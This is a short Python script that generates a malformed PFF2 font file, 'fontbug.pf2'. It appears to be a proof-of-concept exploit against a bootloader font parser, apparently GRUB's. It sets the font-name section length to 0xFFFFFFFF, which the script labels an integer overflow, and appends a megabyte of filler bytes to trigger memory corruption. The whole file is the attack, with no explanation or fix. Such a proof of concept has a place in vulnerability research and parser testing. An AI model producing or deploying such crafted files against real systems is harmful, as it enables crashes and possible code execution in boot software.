from struct import pack, unpack

FONT_FORMAT_PFF2_MAGIC				= "PFF2"
FONT_FORMAT_SECTION_NAMES_FILE			= "FILE"
FONT_FORMAT_SECTION_NAMES_FONT_NAME		= "NAME"
FONT_FORMAT_SECTION_NAMES_POINT_SIZE 		= "PTSZ"
FONT_FORMAT_SECTION_NAMES_WEIGHT		= "WEIG"
FONT_FORMAT_SECTION_NAMES_MAX_CHAR_WIDTH	= "MAXW"
FONT_FORMAT_SECTION_NAMES_MAX_CHAR_HEIGHT 	= "MAXH"
FONT_FORMAT_SECTION_NAMES_ASCENT 		= "ASCE"
FONT_FORMAT_SECTION_NAMES_DESCENT 		= "DESC"
FONT_FORMAT_SECTION_NAMES_CHAR_INDEX 		= "CHIX"
FONT_FORMAT_SECTION_NAMES_DATA			= "DATA"
FONT_FORMAT_SECTION_NAMES_FAMILY		= "FAMI"
FONT_FORMAT_SECTION_NAMES_SLAN 			= "SLAN"


payload  = FONT_FORMAT_SECTION_NAMES_FILE
payload += pack("!I", 0x4)
payload += FONT_FORMAT_PFF2_MAGIC
payload += FONT_FORMAT_SECTION_NAMES_FONT_NAME
payload += pack("!I", 0xFFFFFFFF)	# integer overflow
payload += "A" * (1024 * 1024)

font = open("fontbug.pf2", "wb")
font.write(payload)
font.close()
